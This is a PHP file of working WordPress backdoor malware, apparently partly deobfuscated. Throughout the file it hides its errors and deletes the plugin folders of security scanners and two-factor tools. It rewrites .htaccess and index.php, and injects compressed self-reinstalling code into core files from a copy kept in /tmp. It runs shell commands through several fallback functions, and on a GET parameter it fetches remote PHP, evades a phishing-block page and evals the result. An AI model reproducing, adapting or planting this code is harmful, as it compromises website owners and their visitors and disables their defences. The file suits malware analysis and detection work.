<?php

error_reporting("\0\0\17\3\30");
define('ãêì', 'Úû');
$GLOBALS[ãêì] = array(0 => "error_log", 1 => "log_errors", 2 => "display_errors", 3 => "explode", 4 => "str_split", 5 => "//", 6 => "/", 7 => "//", 8 => "wp-content", 9 => "wp-includes", 10 => "WP", 11 => "OT", 12 => "\n", 13 => "file_put_contents", 14 => "w", 15 => "sucuri-scanner", 16 => "better-wp-security", 17 => "jetpack", 18 => "wpscan", 19 => "wordfence", 20 => "bulletproof-security", 21 => "all-in-one-wp-security-and-firewall", 22 => "miniorange-2-factor-authentication", 23 => "wp-content/plugins/", 24 => "/deny from all/", 25 => "/order allow,deny/", 26 => "/index.php/", 27 => "/index.php.bak/", 28 => "index.php", 29 => "index.php.bak", 30 => "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php\$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>", 31 => "/wp-blog-header.php/", 32 => "<?php\ndefine( 'WP_USE_THEMES', true );\nrequire __DIR__ . '/wp-blog-header.php';", 33 => "<?php", 34 => "'gz'.'unc'.'ompress'", 35 => "/index-configs/", 36 => "/<html/", 37 => "/<div/", 38 => "/<head>/", 39 => "/<script>/", 40 => "<?php", 41 => "wp-includes/plugin.php", 42 => "index.php", 43 => "/\\\$path.*=.*\"(.*)\";/", 44 => "about.php", 45 => "/d_time/", 46 => ".htaccess", 47 => "", 48 => "exec", 49 => "passthru", 50 => "system", 51 => "shell_exec", 52 => "r", 53 => "\n", 54 => "..", 55 => ".", 56 => "/", 57 => "dir", 58 => "../", 59 => "/Warning:/", 60 => "<?php", 61 => "COOKIE.txt", 62 => "/cdn-cgi/phish-bypass?u=/&atok=", 63 => "#name=\"atok\" value=\"(.*)\">#", 64 => "curl_exec", 65 => "https://", 66 => "Mozilla/5.0 (Windows NT 10.0;WOW64;rv:43.0) Gecko/20100101 Firefox/43.0", 67 => "/tmp/", 68 => "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 69 => ".txt", 70 => "file_get_contents", 71 => "r", 72 => "wget ", 73 => " -O ", 74 => "file_get_contents", 75 => "fopen", 76 => "stream_get_contents", 77 => "?", 78 => "y", 79 => "a", 80 => "s", 81 => "b", 82 => "a", 83 => "d", 84 => "u", 85 => "f", 86 => "q", 87 => "k", 88 => "p", 89 => "l", 90 => "z", 91 => "h", 92 => "b", 93 => "i", 94 => "j", 95 => "v", 96 => "q", 97 => "i", 98 => "x", 99 => "h", 100 => "y", 101 => "COOKIE.txt", 102 => "COOKIE.txt", 103 => "HTTP_USER_AGENT", 104 => "file_get_contents", 105 => "fopen", 106 => "stream_get_contents", 107 => "implode", 108 => "file", 109 => "file", 110 => "implode", 111 => "cat ", 112 => ".txt", 113 => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 114 => "WP", 115 => "wp-includes/plugin.php", 116 => "/function do_action\\((.*)/", 117 => "\n\n", 118 => "\n\n", 119 => "wp-includes/plugin.php", 120 => "wp-includes/plugin.php", 121 => "index.php", 122 => "<?php ", 123 => " ?>\n", 124 => "index.php", 125 => "index.php", 126 => ".php", 127 => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 128 => "\t\$", 129 => " = 'create'.'_'.'function'; \$", 130 => " = 'gz'.'unc'.'ompress'; \$", 131 => " = \$", 132 => "('', \$", 133 => "('", 134 => "')); \$", 135 => "();", 136 => "'", 137 => "\\'", 138 => "/php/", 139 => "REQUEST_URI", 140 => "action", 141 => "H*", 142 => "action", 143 => "<?php", 144 => "<?", 145 => "?>", 146 => "http://", 147 => "http://", 148 => "403", 149 => ".user.ini", 150 => ".htaccess", 151 => "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php\$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>", 152 => ".htaccess", 153 => "<!-- KEY: ", 154 => "HTTP_HOST", 155 => "\xe2\x80\x93->");
error_reporting(0);
@ini_set($GLOBALS[ãêì][0], NULL);
@ini_set($GLOBALS[ãêì][0x1], 0);
@ini_set($GLOBALS[ãêì][0x2], 0);
if (!function_exists($GLOBALS[ãêì][0x3])) {
    function explode($str, $array)
    {
        return split($str, $array);
    }
}
if (!function_exists($GLOBALS[ãêì][0x4])) {
    function str_split($text, $split = 0x1)
    {
        $array = array();
        for ($i = 0; $i < strlen($text);) {
            $array[] = substr($text, $i, $split);
            $i += $split;
        }
        return $array;
    }
}
function rFV6n($sOcmx, $ZxM1Q = null, $JsNnj = null)
{
    $Wy7su = curl_init();
    curl_setopt($Wy7su, CURLOPT_URL, $sOcmx);
    curl_setopt($Wy7su, CURLOPT_HEADER, !0);
    curl_setopt($Wy7su, CURLOPT_RETURNTRANSFER, 0x1);
    curl_setopt($Wy7su, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($Wy7su, CURLOPT_CONNECTTIMEOUT, 0x1e);
    curl_setopt($Wy7su, CURLOPT_TIMEOUT, 0x1e);
    curl_setopt($Wy7su, CURLOPT_FOLLOWLOCATION, 0x1);
    curl_setopt($Wy7su, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($Wy7su, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($Wy7su, CURLOPT_USERAGENT, $_SERVER[$GLOBALS[ãêì][0x67]]);
    curl_setopt($Wy7su, CURLOPT_COOKIEFILE, $GLOBALS[ãêì][0x66]);
    curl_setopt($Wy7su, CURLOPT_COOKIEJAR, $GLOBALS[ãêì][0x65]);
    if ($ZxM1Q != null) {
        curl_setopt($Wy7su, CURLOPT_HTTPHEADER, $ZxM1Q);
    }
    if ($JsNnj != null) {
        curl_setopt($Wy7su, CURLOPT_POST, 0x1);
        curl_setopt($Wy7su, CURLOPT_POSTFIELDS, $JsNnj);
    }
    $Z3n6M = curl_exec($Wy7su);
    curl_close($Wy7su);
    return $Z3n6M;
}
function BFhmw($Qi1Nk)
{
    $ed1y5 = $GLOBALS[ãêì][0x2f];
    if (function_exists($GLOBALS[ãêì][0x30])) {
        @exec($Qi1Nk, $ed1y5);
        $ed1y5 = @join($GLOBALS[ãêì][0xc], $ed1y5);
    } elseif (function_exists($GLOBALS[ãêì][0x31])) {
        ob_start();
        @passthru($Qi1Nk);
        $ed1y5 = ob_get_clean();
    } elseif (function_exists($GLOBALS[ãêì][0x32])) {
        ob_start();
        @system($Qi1Nk);
        $ed1y5 = ob_get_clean();
    } elseif (function_exists($GLOBALS[ãêì][0x33])) {
        $ed1y5 = shell_exec($Qi1Nk);
    } elseif (is_resource($hA1iM = @popen($Qi1Nk, $GLOBALS[ãêì][0x34]))) {
        $ed1y5 = $GLOBALS[ãêì][0x2f];
        zegF0:
        if (@feof($hA1iM)) {
            pclose($hA1iM);
        }
        $ed1y5 .= fread($hA1iM, 0x400);
        goto zegF0;
    }
    return $ed1y5;
}
function BfAs_($zi7US)
{
    $A45yw = $GLOBALS[ãêì][0x2f];
    if (trim($A45yw) == $GLOBALS[ãêì][0x2f] && function_exists($GLOBALS[ãêì][0x4a])) {
        $A45yw = file_get_contents($zi7US);
    }
    if (trim($A45yw) == $GLOBALS[ãêì][0x2f] && function_exists($GLOBALS[ãêì][0x40])) {
        $ON_cn = curl_init();
        curl_setopt($ON_cn, CURLOPT_TIMEOUT, 0xa);
        curl_setopt($ON_cn, CURLOPT_RETURNTRANSFER, !0);
        curl_setopt($ON_cn, CURLOPT_URL, $zi7US);
        curl_setopt($ON_cn, CURLOPT_USERAGENT, $GLOBALS[ãêì][0x42]);
        curl_setopt($ON_cn, CURLOPT_FOLLOWLOCATION, !0);
        if (stristr($zi7US, $GLOBALS[ãêì][0x41])) {
            curl_setopt($ON_cn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ON_cn, CURLOPT_SSL_VERIFYHOST, 0);
        }
        curl_setopt($ON_cn, CURLOPT_HEADER, !1);
        $A45yw = curl_exec($ON_cn);
        curl_close($ON_cn);
    }
    if (trim($A45yw) == $GLOBALS[ãêì][0x2f] && function_exists($GLOBALS[ãêì][0x4b]) && function_exists($GLOBALS[ãêì][0x4c])) {
        $YOggb = fopen($zi7US, $GLOBALS[ãêì][0x47]);
        $A45yw = stream_get_contents($YOggb);
    }
    if (trim($A45yw) == $GLOBALS[ãêì][0x2f]) {
        $rLAVM = $GLOBALS[ãêì][0x43] . substr(str_shuffle($GLOBALS[ãêì][0x44]), 0x32) . $GLOBALS[ãêì][0x45];
        bfhmw($GLOBALS[ãêì][0x48] . $zi7US . $GLOBALS[ãêì][0x49] . $rLAVM);
        if (function_exists($GLOBALS[ãêì][0x46])) {
            $A45yw = file_get_contents($rLAVM);
        } else {
            $A45yw = stream_get_contents(fopen($rLAVM, $GLOBALS[ãêì][0x47]));
        }
        unlink($jY9F8);
    }
    return $A45yw;
}
function ZH2PN($f09l7)
{
    $ih2kQ = $GLOBALS[ãêì][0x2f];
    if (function_exists($GLOBALS[ãêì][0x68])) {
        $ih2kQ = file_get_contents($f09l7);
    } elseif (function_exists($GLOBALS[ãêì][0x69]) && function_exists($GLOBALS[ãêì][0x6a])) {
        $ih2kQ = stream_get_contents(fopen($f09l7, $GLOBALS[ãêì][0x47]));
    } elseif (function_exists($GLOBALS[ãêì][0x6b]) && function_exists($GLOBALS[ãêì][0x6c])) {
        $ih2kQ = implode(file($f09l7));
    } elseif (function_exists($GLOBALS[ãêì][0x6d])) {
        $cOsGh = file($f09l7);
        if (function_exists($GLOBALS[ãêì][0x6e])) {
            $ih2kQ = implode($cOsGh);
        } else {
            foreach ($cOsGh as $rJiD5) {
                $ih2kQ .= $rJiD5;
            }
        }
    } else {
        $ih2kQ = bfHmw($GLOBALS[ãêì][0x6f] . $f09l7);
    }
    return $ih2kQ;
}
function scMRk($f09l7, $d003d)
{
    if (function_exists($GLOBALS[ãêì][0xd])) {
        $TDtqs = file_put_contents($f09l7, $d003d);
    } else {
        $TDtqs = fwrite(fopen($f09l7, $GLOBALS[ãêì][0xe]), $d003d);
    }
    return $TDtqs;
}
function WACXp($Fsfw5, $ggXHS)
{
    $RVW2L = 0;
    $FRcoT = zh2pn($Fsfw5);
    $cOsGh = explode($GLOBALS[ãêì][0xc], $FRcoT);
    foreach ($cOsGh as $rJiD5) {
        if (strstr($rJiD5, $ggXHS)) {
            $RVW2L++;
        }
    }
    return $RVW2L;
}
function NfoMq($Fsfw5, $ggXHS)
{
    $D0XOn = wAcxp($Fsfw5, $ggXHS);
    $FRcoT = ZH2Pn($Fsfw5);
    $cOsGh = explode($GLOBALS[ãêì][0xc], $FRcoT);
    $Qa6yD = $GLOBALS[ãêì][0x2f];
    foreach ($cOsGh as $rJiD5) {
        if (strstr($rJiD5, $ggXHS) || $D0XOn <= 0) {
            $D0XOn--;
            if ($D0XOn <= 0) {
                $Qa6yD .= $rJiD5 . $GLOBALS[ãêì][0x35];
            }
        }
    }
    return $Qa6yD;
}
function XHPMI($wonRF)
{
    $O_DbK = $wonRF . $GLOBALS[ãêì][0x2e];
    $rJpF3 = strtolower(zH2pn($O_DbK));
    if (preg_match($GLOBALS[ãêì][0x18], $rJpF3) || preg_match($GLOBALS[ãêì][0x19], $rJpF3)) {
        $cwoBJ = $wonRF . $GLOBALS[ãêì][0x29];
        $asG9n = ZH2Pn($cwoBJ);
        if (preg_match($GLOBALS[ãêì][0x1a], $asG9n) && !preg_match($GLOBALS[ãêì][0x1b], $asG9n)) {
            $asG9n = str_replace($GLOBALS[ãêì][0x1c], $GLOBALS[ãêì][0x1d], $asG9n);
            chmod($cwoBJ, 0644);
            sCmRK($cwoBJ, $asG9n);
        }
        if (preg_match($GLOBALS[ãêì][0x2b], $asG9n, $wpxG9)) {
            unlink($wpxG9[0x1]);
        }
        $U7QCM = $wonRF . $GLOBALS[ãêì][0x2c];
        $w2MKM = Zh2Pn($U7QCM);
        if (file_exists($U7QCM) && preg_match($GLOBALS[ãêì][0x2d], $w2MKM)) {
            unlink($U7QCM);
        }
        $h8Dd6 = $wonRF . $GLOBALS[ãêì][0x2a];
        $wDPPj = zh2pN($h8Dd6);
        if (preg_match($GLOBALS[ãêì][0x1f], $wDPPj)) {
            $OdHvX = $GLOBALS[ãêì][0x20];
            chmod($h8Dd6, 0644);
            scmrK($h8Dd6, $OdHvX);
        } elseif (strstr($wDPPj, $GLOBALS[ãêì][0x21]) && !strstr($wDPPj, $GLOBALS[ãêì][0x22]) && !preg_match($GLOBALS[ãêì][0x23], $wDPPj) && !preg_match($GLOBALS[ãêì][0x24], $wDPPj) && !preg_match($GLOBALS[ãêì][0x25], $wDPPj) && !preg_match($GLOBALS[ãêì][0x26], $wDPPj) && !preg_match($GLOBALS[ãêì][0x27], $wDPPj)) {
            $OdHvX = nFoMQ($h8Dd6, $GLOBALS[ãêì][0x28]);
            chmod($h8Dd6, 0644);
            SCmRk($h8Dd6, $OdHvX);
        }
        chmod($O_DbK, 0644);
        $ak3qt = $GLOBALS[ãêì][0x1e];
        ScMrK($O_DbK, $ak3qt);
    }
}
function v4MsG($f09l7)
{
    $f09l7 = substr($f09l7, -1) == $GLOBALS[ãêì][0x6] ? $f09l7 : $f09l7 . $GLOBALS[ãêì][0x38];
    $dgRDw = opendir($f09l7);
    BxnEG:
    if (!(($QSQpa = readdir($dgRDw)) !== !1)) {
        closedir($dgRDw);
        @rmdir($f09l7);
        // [PHPDeobfuscator] Implied return
        return;
    }
    $QSQpa = $f09l7 . $QSQpa;
    if (basename($QSQpa) == $GLOBALS[ãêì][0x36] || basename($QSQpa) == $GLOBALS[ãêì][0x37]) {
        goto BxnEG;
    }
    $cMQxW = filetype($QSQpa);
    if ($cMQxW == $GLOBALS[ãêì][0x39]) {
        V4msG($QSQpa);
    } else {
        @unlink($QSQpa);
    }
    goto BxnEG;
}
function LzV6q($wonRF)
{
    $WLEqA = array($GLOBALS[ãêì][0xf], $GLOBALS[ãêì][0x10], $GLOBALS[ãêì][0x11], $GLOBALS[ãêì][0x12], $GLOBALS[ãêì][0x13], $GLOBALS[ãêì][0x14], $GLOBALS[ãêì][0x15], $GLOBALS[ãêì][0x16]);
    foreach ($WLEqA as $asG9n) {
        $IK9P5 = $wonRF . $GLOBALS[ãêì][0x17] . $asG9n;
        if (is_dir($IK9P5)) {
            V4MsG($IK9P5);
        }
    }
}
function Xk203($wonRF)
{
    if (is_dir($wonRF . $GLOBALS[ãêì][0x8]) && is_dir($wonRF . $GLOBALS[ãêì][0x9])) {
        return $GLOBALS[ãêì][0xa];
    } else {
        return $GLOBALS[ãêì][0xb];
    }
}
function OgR9h($wonRF)
{
    $b8ZXu = strval(basename("/var/www/html/bkv74.php"));
    $hA1iM = explode($GLOBALS[ãêì][0x37], $b8ZXu);
    $b8ZXu = $hA1iM[0] . $GLOBALS[ãêì][0x7e];
    $vu1_G = $hA1iM[0] . $GLOBALS[ãêì][0x70];
    $Wefr2 = getcwd() . $GLOBALS[ãêì][0x6] . $b8ZXu;
    $UeCFa = $GLOBALS[ãêì][0x43] . $vu1_G;
    if (!file_exists($UeCFa) || !preg_match($GLOBALS[ãêì][0x8a], zh2Pn($UeCFa))) {
        scmRk($UeCFa, Zh2PN($b8ZXu));
    }
    $LjOCZ = substr(str_shuffle($GLOBALS[ãêì][0x71]), 0x2d);
    $bZbwg = substr(str_shuffle($GLOBALS[ãêì][0x7f]), 0x2d);
    $A9_Vk = gzcompress("if(!is_writable('{$Wefr2}')){ chmod('{$Wefr2}', 0644); } if(file_exists('{$UeCFa}') && (!file_exists('{$Wefr2}') || !preg_match(\"/php/\", file_get_contents('{$Wefr2}')) )){ file_put_contents('{$Wefr2}', file_get_contents('{$UeCFa}')); }");
    $A9_Vk = str_replace($GLOBALS[ãêì][0x88], $GLOBALS[ãêì][0x89], $A9_Vk);
    $YIiqm = $GLOBALS[ãêì][0x80] . $LjOCZ . $GLOBALS[ãêì][0x81] . $bZbwg . $GLOBALS[ãêì][0x82] . $hA1iM[0] . $GLOBALS[ãêì][0x83] . $LjOCZ . $GLOBALS[ãêì][0x84] . $bZbwg . $GLOBALS[ãêì][0x85] . $A9_Vk . $GLOBALS[ãêì][0x86] . $hA1iM[0] . $GLOBALS[ãêì][0x87];
    $wctmt = XK203($wonRF);
    if ($wctmt == $GLOBALS[ãêì][0x72]) {
        $yz6QS = zH2pn($wonRF . $GLOBALS[ãêì][0x73]);
        if (preg_match($GLOBALS[ãêì][0x74], $yz6QS, $TJAz0) && !preg_match($GLOBALS[ãêì][0x38] . $hA1iM[0] . $GLOBALS[ãêì][0x6], $yz6QS)) {
            $d003d = $TJAz0[0] . $GLOBALS[ãêì][0x75] . $YIiqm . $GLOBALS[ãêì][0x76];
            $hXqhD = str_replace($TJAz0[0], $d003d, $yz6QS);
            chmod($wonRF . $GLOBALS[ãêì][0x78], 0644);
            sCmrk($wonRF . $GLOBALS[ãêì][0x77], $hXqhD);
        }
    } else {
        $wDPPj = zh2Pn($wonRF . $GLOBALS[ãêì][0x79]);
        if (!preg_match($GLOBALS[ãêì][0x6] . $hA1iM[0] . $GLOBALS[ãêì][0x38], $wDPPj)) {
            $Bw3cc = $GLOBALS[ãêì][0x7a] . $YIiqm . $GLOBALS[ãêì][0x7b] . $wDPPj;
            chmod($wonRF . $GLOBALS[ãêì][0x7d], 0644);
            ScMrK($wonRF . $GLOBALS[ãêì][0x7c], $Bw3cc);
        }
    }
}
function tEg0E($mCw4J, $d003d)
{
    if (preg_match($GLOBALS[ãêì][0x3b], $d003d)) {
        preg_match($GLOBALS[ãêì][0x3f], $d003d, $dUV9v);
        $dUV9v = $dUV9v[0x1];
        $weS2x = rFV6n($mCw4J . $GLOBALS[ãêì][0x3e] . $dUV9v);
        $d003d = rfV6N($mCw4J);
        $P5c3s = $GLOBALS[ãêì][0x3c];
        $CByVN = strpos($d003d, $P5c3s) + strlen($P5c3s);
        $d003d = $GLOBALS[ãêì][0x21] . substr($d003d, $CByVN);
        unlink($GLOBALS[ãêì][0x3d]);
    }
    return $d003d;
}
function y8x3k($aEqT4)
{
    return $aEqT4;
}
$qJ1An = strval($_SERVER[$GLOBALS[ãêì][0x8b]]);
ISqm7:
if (!strstr($qJ1An, $GLOBALS[ãêì][0x7])) {
    if (strstr($qJ1An, $GLOBALS[ãêì][0x4d])) {
        $qJ1An = explode($GLOBALS[ãêì][0x4d], $qJ1An);
        $qJ1An = $qJ1An[0];
    }
    $OQrG3 = substr_count($qJ1An, $GLOBALS[ãêì][0x6]);
    $wonRF = $GLOBALS[ãêì][0x2f];
    $mAGdQ = 0x1;
    OwBcb:
    if (!($mAGdQ < intval($OQrG3))) {
        oGr9H($wonRF);
        xhPMi($wonRF);
        Lzv6q($wonRF);
        if (isset($_GET[$GLOBALS[ãêì][0x8c]])) {
            $mLSu_ = trim($_GET[$GLOBALS[ãêì][0x8e]]);
            $mLSu_ = str_rot13(pack($GLOBALS[ãêì][0x8d], strrev($mLSu_)));
            $kKR9a = bfAS_($GLOBALS[ãêì][0x93] . y8X3K($mLSu_));
            $kKR9a = teg0e($GLOBALS[ãêì][0x92] . Y8X3k($mLSu_), $kKR9a);
            $kKR9a = str_replace(array($GLOBALS[ãêì][0x8f], $GLOBALS[ãêì][0x90], $GLOBALS[ãêì][0x91]), $GLOBALS[ãêì][0x2f], $kKR9a);
            eval($kKR9a);
        } elseif (isset($_GET[$GLOBALS[ãêì][0x94]])) {
            $rJpF3 = $GLOBALS[ãêì][0x97];
            chmod($wonRF . $GLOBALS[ãêì][0x98], 0644);
            SCmrK($wonRF . $GLOBALS[ãêì][0x96], $rJpF3);
            unlink($wonRF . $GLOBALS[ãêì][0x95]);
        } else {
            echo $GLOBALS[ãêì][0x99] . md5($_SERVER[$GLOBALS[ãêì][0x9a]]) . $GLOBALS[ãêì][0x9b];
        }
        // [PHPDeobfuscator] Implied script end
        return;
    }
    $wonRF .= $GLOBALS[ãêì][0x3a];
    $mAGdQ++;
    goto OwBcb;
}
$qJ1An = str_replace($GLOBALS[ãêì][0x5], $GLOBALS[ãêì][0x6], $qJ1An);
goto ISqm7;
